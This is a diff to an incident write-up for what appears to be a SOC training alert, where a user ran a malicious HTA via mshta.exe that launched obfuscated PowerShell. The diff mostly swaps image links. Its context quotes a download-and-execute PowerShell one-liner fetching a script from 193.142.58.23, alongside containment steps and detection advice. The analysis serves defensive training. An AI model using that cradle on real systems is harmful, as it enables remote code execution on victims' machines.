@@ -6,7 +6,8 @@
 
 A user on host Roberto ran a low-reputation HTA file with `mshta.exe`, and EDR allowed it. One minute later, obfuscated PowerShell launched by the HTA tried to download and execute a remote script from `193.142.58.23`, so the alert was closed as a true positive and the host was contained.
 
-![01-alert-details](images/soc164-01-alert-details.png)
+<img width="1622" height="305" alt="soc164-01-alert-details" src="https://github.com/user-attachments/assets/3aacd487-51b2-4d27-9fd9-f09fb6524d64" />
+
 
 ## The Attack
 
@@ -61,7 +62,8 @@ iEX (New-Object Net.WebClient).DownloadString('http://193.142.58.23/Server.txt')
 
 It fetches `Server.txt` from `193.142.58.23` and runs it in memory, with nothing written to disk.
 
-![02-terminal-history](images/soc164-02-terminal-history.png)
+<img width="1370" height="469" alt="soc164-02-terminal-history" src="https://github.com/user-attachments/assets/b5b63f1f-052a-47f3-b7d9-d3f420d022a5" />
+
 
 ### 3. Verdict Reasoning
 
@@ -91,6 +93,9 @@ Host Roberto was contained. Follow-up: search Log Management for connections to 
 To prevent a repeat, block or restrict `mshta.exe` for standard users, alert on `mshta.exe` spawning `powershell.exe`, enable PowerShell script block logging to capture decoded commands, and block `.hta` attachments at the email gateway.
 
 ## Conclusion
+
+<img width="1556" height="353" alt="soc164-04-playbook-result" src="https://github.com/user-attachments/assets/0815991e-76b5-4372-8268-967098d1941b" />
+
 
 **True Positive.** A user ran a malicious HTA file with `mshta.exe` on `Roberto`, which launched obfuscated PowerShell to download and execute a script from `193.142.58.23`. The host was contained.
 
